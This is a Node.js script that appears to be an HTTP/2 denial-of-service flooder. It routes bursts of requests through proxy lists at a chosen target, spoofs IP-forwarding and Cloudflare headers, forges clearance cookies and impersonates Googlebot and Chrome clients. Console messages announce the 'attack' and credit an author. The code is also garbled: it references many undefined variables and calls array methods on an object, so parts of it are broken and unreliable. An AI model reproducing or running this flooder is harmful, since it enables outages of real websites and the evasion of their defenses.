const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 const axios = require('axios');
 const cheerio = require('cheerio'); 
 const colors = require('colors')

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){console.log(`Usage: target time rate thread proxyfile`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }
 
 const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };
 
 const spoofed = ip_spoof();
 
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6]
 }
 const sig = [
    'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',    
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'ecdsa_brainpoolP256r1tls13_sha256',
    'ecdsa_brainpoolP384r1tls13_sha384',
    'ecdsa_brainpoolP512r1tls13_sha512',
    'dsa_sha256',
    'dsa_sha384',
    'dsa_sha512',
    'dsa_sha224',
    'dsa_sha1',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
    'sm2sig_sm3'
 ];
 const sigalgs1 = sig.join(':');
 const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES"
 ];
 const accept_header = [
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
 ]; 
 const lang_header = [
  'en-US,en;q=0.9',
  'en-GB,en;q=0.9',
  'en-CA,en;q=0.9',
  'en-AU,en;q=0.9',
  'en-NZ,en;q=0.9',
  'en-ZA,en;q=0.9',
  'en-IE,en;q=0.9',
  'en-IN,en;q=0.9',
  'ar-SA,ar;q=0.9',
  'az-Latn-AZ,az;q=0.9',
  'be-BY,be;q=0.9',
  'bg-BG,bg;q=0.9',
  'bn-IN,bn;q=0.9',
  'ca-ES,ca;q=0.9',
  'cs-CZ,cs;q=0.9',
  'cy-GB,cy;q=0.9',
  'da-DK,da;q=0.9',
  'de-DE,de;q=0.9',
  'el-GR,el;q=0.9',
  'es-ES,es;q=0.9',
  'et-EE,et;q=0.9',
  'eu-ES,eu;q=0.9',
  'fa-IR,fa;q=0.9',
  'fi-FI,fi;q=0.9',
  'fr-FR,fr;q=0.9',
  'ga-IE,ga;q=0.9',
  'gl-ES,gl;q=0.9',
  'gu-IN,gu;q=0.9',
  'he-IL,he;q=0.9',
  'hi-IN,hi;q=0.9',
  'hr-HR,hr;q=0.9',
  'hu-HU,hu;q=0.9',
  'hy-AM,hy;q=0.9',
  'id-ID,id;q=0.9',
  'is-IS,is;q=0.9',
  'it-IT,it;q=0.9',
  'ja-JP,ja;q=0.9',
  'ka-GE,ka;q=0.9',
  'kk-KZ,kk;q=0.9',
  'km-KH,km;q=0.9',
  'kn-IN,kn;q=0.9',
  'ko-KR,ko;q=0.9',
  'ky-KG,ky;q=0.9',
  'lo-LA,lo;q=0.9',
  'lt-LT,lt;q=0.9',
  'lv-LV,lv;q=0.9',
  'mk-MK,mk;q=0.9',
  'ml-IN,ml;q=0.9',
  'mn-MN,mn;q=0.9',
  'mr-IN,mr;q=0.9',
  'ms-MY,ms;q=0.9',
  'mt-MT,mt;q=0.9',
  'my-MM,my;q=0.9',
  'nb-NO,nb;q=0.9',
  'ne-NP,ne;q=0.9',
  'nl-NL,nl;q=0.9',
  'nn-NO,nn;q=0.9',
  'or-IN,or;q=0.9',
  'pa-IN,pa;q=0.9',
  'pl-PL,pl;q=0.9',
  'pt-BR,pt;q=0.9',
  'pt-PT,pt;q=0.9',
  'ro-RO,ro;q=0.9',
  'ru-RU,ru;q=0.9',
  'si-LK,si;q=0.9',
  'sk-SK,sk;q=0.9',
  'sl-SI,sl;q=0.9',
  'sq-AL,sq;q=0.9',
  'sr-Cyrl-RS,sr;q=0.9',
  'sr-Latn-RS,sr;q=0.9',
  'sv-SE,sv;q=0.9',
  'sw-KE,sw;q=0.9',
  'ta-IN,ta;q=0.9',
  'te-IN,te;q=0.9',
  'th-TH,th;q=0.9',
  'tr-TR,tr;q=0.9',
  'uk-UA,uk;q=0.9',
  'ur-PK,ur;q=0.9',
  'uz-Latn-UZ,uz;q=0.9',
  'vi-VN,vi;q=0.9',
  'zh-CN,zh;q=0.9',
  'zh-HK,zh;q=0.9',
  'zh-TW,zh;q=0.9',
  'am-ET,am;q=0.8',
  'as-IN,as;q=0.8',
  'az-Cyrl-AZ,az;q=0.8',
  'bn-BD,bn;q=0.8',
  'bs-Cyrl-BA,bs;q=0.8',
  'bs-Latn-BA,bs;q=0.8',
  'dz-BT,dz;q=0.8',
  'fil-PH,fil;q=0.8',
  'fr-CA,fr;q=0.8',
  'fr-CH,fr;q=0.8',
  'fr-BE,fr;q=0.8',
  'fr-LU,fr;q=0.8',
  'gsw-CH,gsw;q=0.8',
  'ha-Latn-NG,ha;q=0.8',
  'hr-BA,hr;q=0.8',
  'ig-NG,ig;q=0.8',
  'ii-CN,ii;q=0.8',
  'is-IS,is;q=0.8',
  'jv-Latn-ID,jv;q=0.8',
  'ka-GE,ka;q=0.8',
  'kkj-CM,kkj;q=0.8',
  'kl-GL,kl;q=0.8',
  'km-KH,km;q=0.8',
  'kok-IN,kok;q=0.8',
  'ks-Arab-IN,ks;q=0.8',
  'lb-LU,lb;q=0.8',
  'ln-CG,ln;q=0.8',
  'mn-Mong-CN,mn;q=0.8',
  'mr-MN,mr;q=0.8',
  'ms-BN,ms;q=0.8',
  'mt-MT,mt;q=0.8',
  'mua-CM,mua;q=0.8',
  'nds-DE,nds;q=0.8',
  'ne-IN,ne;q=0.8',
  'nso-ZA,nso;q=0.8',
  'oc-FR,oc;q=0.8',
  'pa-Arab-PK,pa;q=0.8',
  'ps-AF,ps;q=0.8',
  'quz-BO,quz;q=0.8',
  'quz-EC,quz;q=0.8',
  'quz-PE,quz;q=0.8',
  'rm-CH,rm;q=0.8',
  'rw-RW,rw;q=0.8',
  'sd-Arab-PK,sd;q=0.8',
  'se-NO,se;q=0.8',
  'si-LK,si;q=0.8',
  'smn-FI,smn;q=0.8',
  'sms-FI,sms;q=0.8',
  'syr-SY,syr;q=0.8',
  'tg-Cyrl-TJ,tg;q=0.8',
  'ti-ER,ti;q=0.8',
  'tk-TM,tk;q=0.8',
  'tn-ZA,tn;q=0.8',
  'tt-RU,tt;q=0.8',
  'ug-CN,ug;q=0.8',
  'uz-Cyrl-UZ,uz;q=0.8',
  've-ZA,ve;q=0.8',
  'wo-SN,wo;q=0.8',
  'xh-ZA,xh;q=0.8',
  'yo-NG,yo;q=0.8',
  'zgh-MA,zgh;q=0.8',
  'zu-ZA,zu;q=0.8'
];

 version = [
    '"Chromium";v="116", "Not)A;Brand";v="8", "Google Chrome";v="116"',
    '"Chromium";v="115", "Not)A;Brand";v="8", "Google Chrome";v="115"',
    '"Chromium";v="114", "Not)A;Brand";v="8", "Google Chrome";v="114"',
    '"Chromium";v="113", "Not)A;Brand";v="8", "Google Chrome";v="113"',
    '"Chromium";v="112", "Not)A;Brand";v="8", "Google Chrome";v="112"',
    '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    '"Chromium";v="115", "Not)A;Brand";v="24", "Google Chrome";v="115"',
    '"Chromium";v="114", "Not)A;Brand";v="24", "Google Chrome";v="114"',
    '"Chromium";v="113", "Not)A;Brand";v="24", "Google Chrome";v="113"',
    '"Chromium";v="112", "Not)A;Brand";v="24", "Google Chrome";v="112"',
    '"Chromium";v="116", "Not)A;Brand";v="99", "Google Chrome";v="116"',
    '"Chromium";v="115", "Not)A;Brand";v="99", "Google Chrome";v="115"',
    '"Chromium";v="114", "Not)A;Brand";v="99", "Google Chrome";v="114"',
    '"Chromium";v="113", "Not)A;Brand";v="99", "Google Chrome";v="113"',
    '"Chromium";v="112", "Not)A;Brand";v="99", "Google Chrome";v="112"'
 ];

 const a6 = [
  '"Chromium";v="116.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="116.0.0.0"',
  '"Chromium";v="115.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="115.0.0.0"',
  '"Chromium";v="114.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="114.0.0.0"',
  '"Chromium";v="113.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="113.0.0.0"',
  '"Chromium";v="112.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="112.0.0.0"',
  '"Chromium";v="116.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.0.0"',
  '"Chromium";v="115.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="115.0.0.0"',
  '"Chromium";v="114.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="114.0.0.0"',
  '"Chromium";v="113.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="113.0.0.0"',
  '"Chromium";v="112.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="112.0.0.0"',
  '"Chromium";v="116.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="116.0.0.0"',
  '"Chromium";v="115.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="115.0.0.0"',
  '"Chromium";v="114.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="114.0.0.0"',
  '"Chromium";v="113.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="113.0.0.0"',
  '"Chromium";v="112.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="112.0.0.0"',
 ];

const jalist = [
 "002205d0f96c37c5e660b9f041363c1",
 "073eede15b2a5a0302d823ecbd5ad15b",
 "0b61c673ee71fe9ee725bd687c455809",
 "6cd1b944f5885e2cfbe98a840b75eeb8",
 "94c485bca29d5392be53f2b8cf7f4304",
 "b4f4e6164f938870486578536fc1ffce",
 "b8f81673c0e1d29908346f3bab892b9b",
 "baaac9b6bf25ad098115c71c59d29e51",
 "bc6c386f480ee97b9d9e52d472b772d8",
 "da949afd9bd6df820730f8f171584a71",
 "f58966d34ff9488a83797b55c804724d",
 "fd6314b03413399e4f23d1524d206692",
 "0a81538cf247c104edb677bdb8902ed5",
 "0b6592fd91d4843c823b75e49b43838d",
 "0ffee3ba8e615ad22535e7f771690a28",
 "1c15aca4a38bad90f9c40678f6aface9",
 "5163bc7c08f57077bc652ec370459c2f",
 "a88f1426c4603f2a8cd8bb41e875cb75",
 "b03910cc6de801d2fcfa0c3b9f397df4",
 "bfcc1a3891601edb4f137ab7ab25b840",
 "ce694315cbb81ce95e6ae4ae8cbafde6",
 "f15797a734d0b4f171a86fd35c9a5e43"
];
 
 const encoding_header = ["gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip identity"];
 
 const control_header = ["no-cache", "max-age=0"];
 
 const refers = [
     "https://www.google.com/",
     "https://www.facebook.com/",
     "https://www.twitter.com/",
     "https://www.youtube.com/",
     "https://www.linkedin.com/"
 ];
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers1 = "GREASE:" + [
     defaultCiphers[2],
     defaultCiphers[1],
     defaultCiphers[0],
     ...defaultCiphers.slice(3)
 ].join(":");
 
 const uap = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5625.214 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36"
 ];

 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
 var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);
      if (cluster.isMaster) {
        for (let counter = 1; counter <= args.threads; counter++) {
          cluster.fork();
        }

        const proxyList = readLines(args.proxyFile);
        console.clear()
        console.log(`\x1b[38;2;255;0;0mAttack sent all ${proxyList.length} proxies to the website.`)
        console.log(`\x1b[38;2;255;0;0mTarget: ${process.argv[2]} | Duration: ${process.argv[3]} | RPS: ${process.argv[4]} | Threads: ${process.argv[5]}`)
        console.log(`Attack Successfully Sent Script made by: Yuki`)
        // ...
      } else {
        setInterval(runFlooder);
      }
      
 const rateHeaders = [
{ "A-IM": "Feed" },
{ "accept": accept },
{ "accept-charset": accept },
{ "accept-datetime": accept },
{ "accept-encoding": encoding },
{ "accept-language": lang },
{ "upgrade-insecure-requests": "1" },
{ "Access-Control-Request-Method": "GET" },
{ "Cache-Control": "no-cache" },
{ "Content-Encoding": "gzip" },
{ "content-type": "text/html" },
{ "cookie": randstr(15) },
{ "Expect": "100-continue" },
{ "Forwarded": "for=192.168.0.1;proto=http;by=" + spoofed },
{ "From": "user@gmail.com" },
{ "Max-Forwards": "10" },
{ "origin": "https://" + parsedTarget.host },
{ "pragma": "no-cache" },
{ "referer": "https://" + parsedTarget.host + "/" },
];

const rateHeaders2 = [
{ "Via": "1.1 " + parsedTarget.host },
{ "X-Requested-With": "XMLHttpRequest" },
{ "X-Forwarded-For": spoofed },
{ "X-Vercel-Cache": randstr(15) },
{ "Alt-Svc": "http/1.1=http2." + parsedTarget.host + "; ma=7200" },
{ "TK": "?" },
{ "X-Frame-Options": "deny" },
{ "X-ASP-NET": randstr(25) },
{ "Refresh": "5" },
{ "X-Content-duration": spoofed },
{ "service-worker-navigation-preload": Math.random() < 0.5 ? 'true' : 'null' },
];
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     //connection.setTimeout(options.timeout * 600000);
     connection.setTimeout(options.timeout * 100000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }

 const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":method"] = "POST";
headers[":authority"] = parsedTarget.host;
headers["x-forwarded-proto"] = "https";
headers[":path"] = parsedTarget.path + "?" + randstr(6) + "=" + randstr(15);
headers[":scheme"] = "https";
headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
headers[":path"] = parsedTarget.path
headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
headers[":path"] = parsedTarget.path + "?" + randstr(6) + "=" + randstr(15);
headers[":authority"] = parsedTarget.host;
headers["origin"] = parsedTarget.host;
headers["Via"] = fakeIP;
headers["sss"] = fakeIP;
headers["Sec-Websocket-Key"] = fakeIP;
headers["Sec-Websocket-Version"] = 13;
headers["Upgrade"] = websocket;
headers["X-Forwarded-For"] = fakeIP;
headers["X-Forwarded-Host"] = fakeIP;
headers["Client-IP"] = fakeIP;
headers["Real-IP"] = fakeIP;
headers["Referer"] = randomReferer;
headers["User-Agent"] = randomHeaders['User-Agent'];
headers["user-agent"] = uap;
headers["User-Agent"] = uap;
headers["CF-Connecting-IP"] = fakeIP;
headers["CF-RAY"] = "randomRayValue";
headers["CF-Visitor"] = "{'scheme':'https'}";
headers["X-Forwarded-For"] = spoofed
headers["X-Forwarded-For"] = spoofed
headers["X-Forwarded-For"] = spoofed
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
headers[":scheme"] = "https";
headers["x-forwarded-proto"] = "https";
headers["cache-control"] = "no-cache";
headers["X-Forwarded-For"] = spoofed;
headers["sec-ch-ua"] = '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"';
headers["sec-ch-ua-mobile"] = "?0";
headers["sec-ch-ua-platform"] = "Windows";
headers["accept-language"] = lang;
headers["accept-encoding"] = encoding;
headers["upgrade-insecure-requests"] = "1";
headers["accept"] = accept;
headers["user-agent"] = moz + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7);
headers["referer"] = Ref;
headers["sec-fetch-mode"] = "navigate"; 
headers["sec-fetch-dest"] = dest1;
headers["sec-fetch-user"] = "?1";
headers["TE"] = "trailers";
headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
headers["sec-fetch-site"] = site1;
headers["x-requested-with"] = "XMLHttpRequest";
headers.GET = ' / HTTP/2';
headers[':path'] = parsedTarget.path;
headers[':scheme'] = 'https';
headers.Referer = 'https://google.com';
headers.accept_header = xn;
headers['accept-language'] = badag;
headers['accept-encoding'] = enc; 
headers.Connection = 'keep-alive';
headers['upgrade-insecure-requests'] = '1';
headers.TE = 'trailers';
headers['x-requested-with'] = 'XMLHttpRequest';
headers['Max-Forwards'] = '10';
headers.pragma = 'no-cache';
headers.Cookie = 'cf_clearance=mOvsqA7JGiSddvLfrKvg0VQ4ARYRoOK9qmQZ7xTjC9g-1698947194-0-1-67ed94c7.1e69758c.36e830ad-250.2.1698947194'; 
headers["Real-IP"] = spoofed;
headers["referer"] = Ref;
headers[":authority"] = parsedTarget.host + ":80"; // Include port 80 in :authority header
headers["origin"] = "https://" + parsedTarget.host + ":80"; // Include port 80 in origin header
headers["Via"] = "1.1 " + parsedTarget.host + ":80"; // Include port 80 in Via header
headers[":authority"] = parsedTarget.host + ":443"; // Include port 80 in :authority header
headers["origin"] = "https://" + parsedTarget.host + ":443"; // Include port 80 in origin header
headers["Via"] = "1.1 " + parsedTarget.host + ":443"; // Include port 80 in Via header
headers.push({ "Alt-Svc": "http/1.1=" + parsedTarget.host + "; ma=7200" }); // Add the http/1.1 header
headers.push({ "Alt-Svc": "http/1.2=" + parsedTarget.host + "; ma=7200" }); // Add the http/1.2 header
headers.push({ "Alt-Svc": "http/2=" + parsedTarget.host + "; ma=7200" });   // Add the http/2 header 
headers.push({ "Alt-Svc": "http/1.1=http2." + parsedTarget.host + ":80; ma=7200" }); // Add the http/1.1 header with port 80
headers.push({ "Alt-Svc": "http/1.2=http2." + parsedTarget.host + ":80; ma=7200" }); // Add the http/1.2 header with port 80
headers.push({ "Alt-Svc": "http/2=http2." + parsedTarget.host + ":80; ma=7200" });   // Add the http/2 header with port 80
headers.push({ "Alt-Svc": "http/1.1=" + parsedTarget.host + ":443; ma=7200" });      // Add the http/1.1 header with port 443
headers.push({ "Alt-Svc": "http/1.2=" + parsedTarget.host + ":443; ma=7200" });      // Add the http/1.2 header with port 443
headers.push({ "Alt-Svc": "http/2=" + parsedTarget.host + ":443; ma=7200" });        // Add the http/2 header with port 443  
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
headers[":scheme"] = "https";
headers["x-forwarded-proto"] = "https";
headers["cache-control"] = "no-cache";
headers["X-Forwarded-For"] = spoofed;
headers["sec-ch-ua"] = '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"';
headers["sec-ch-ua-mobile"] = "?0";
headers["sec-ch-ua-platform"] = "Windows";
headers["accept-language"] = lang; 
headers["accept-encoding"] = encoding;
headers["upgrade-insecure-requests"] = "1"; 
headers["accept"] = accept;
headers["user-agent"] = moz + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7);
headers["referer"] = Ref;
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-dest"] = dest1;
headers["sec-fetch-user"] = "?1";
headers["TE"] = "trailers";
headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
headers["sec-fetch-site"] = site1;
headers["x-requested-with"] = "XMLHttpRequest";
headers["cf-cache-status"] = "BYPASS";
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":"); 
	 //headers[":authority"] = parsedTarget.host;
         headers["referer"] = "https://" + parsedTarget.host + "/?" + randstr(15);
         headers["origin"] = "https://" + parsedTarget.host;

     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100,
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
            host: parsedTarget.host,
            port: 443,
            secure: true,
            ALPNProtocols: ['h2'],
            sigals: siga,
            socket: connection,
            ciphers: tls.getCiphers().join(":") + cipper,
            ecdhCurve: "prime256v1:X25519",
            host: parsedTarget.host,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: "TLS_method",
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60000);

         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 2000,
            initialWindowSize: 65535,
            maxHeaderListSize: 65536,
            enablePush: false
          },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 2000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    //headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
     }),function (error, response, body) {
		};
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);